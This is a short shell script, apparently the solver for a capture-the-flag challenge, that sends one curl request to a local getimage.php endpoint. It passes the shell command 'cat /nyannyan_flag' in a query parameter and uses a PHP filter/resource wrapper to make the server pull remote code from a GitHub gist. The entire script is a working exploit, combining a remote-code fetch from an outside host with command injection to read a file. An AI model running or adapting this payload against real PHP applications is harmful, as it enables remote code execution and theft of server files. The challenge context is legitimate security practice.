HOST=${HOST:-localhost}
PORT=${PORT:-10003}
curl "http://${HOST}:${PORT}/getimage.php?q=cat%20/nyannyan_flag" -d "ext=php:&name=/filter/resource=https://gist.githubusercontent.com/theoldmoon0602/8eea105c3bbf93b1dcd04327f9643265/raw/a291a31887dbd9f2de05047be2f917ad8dd1b165/test"
